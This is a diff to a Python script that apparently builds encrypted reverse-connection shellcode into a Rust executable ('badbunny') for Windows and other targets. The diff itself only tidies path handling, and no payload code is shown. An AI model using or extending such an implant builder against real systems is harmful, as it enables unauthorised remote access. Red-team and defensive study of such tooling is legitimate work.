@@ -7,6 +7,8 @@ import platform as py_platform
 import difflib
 import sys
 
+SCRIPT_ROOT = os.path.dirname(os.path.abspath(__file__))
+
 def get_target_triple(platform_name):
     if platform_name == "windows":
         return "x86_64-pc-windows-gnu"
@@ -31,6 +33,7 @@ def generate_encrypted_shellcode(lhost, lport, key):
 
 def embed_shellcode_in_rust(rust_path, encrypted_b64, key):
     """Embed the base64-encoded shellcode and key into the Rust source file."""
+    rust_path = os.path.abspath(rust_path)
     with open(rust_path, "r") as f:
         lines = f.readlines()
     
@@ -45,6 +48,7 @@ def embed_shellcode_in_rust(rust_path, encrypted_b64, key):
 
 def build_rust_project(project_dir, platform_name):
     """Compile the Rust project using cargo for the specified platform and return the executable path."""
+    project_dir = os.path.abspath(project_dir)
     target_triple = get_target_triple(platform_name)
     cmd = f"cargo build --release --target {target_triple}"
     subprocess.run(cmd, shell=True, check=True, cwd=project_dir)
@@ -111,7 +115,7 @@ if __name__ == "__main__":
     output = args.output
     platform_name = args.platform
     
-    base_dir = os.path.dirname(os.path.abspath(__file__))
+    base_dir = SCRIPT_ROOT
     project_dir = os.path.join(base_dir, "source", "badbunny")
     rust_file = os.path.join(project_dir, "src", "main.rs")
     output_dir = os.path.join(base_dir, "..", "filedaemon", "dir")
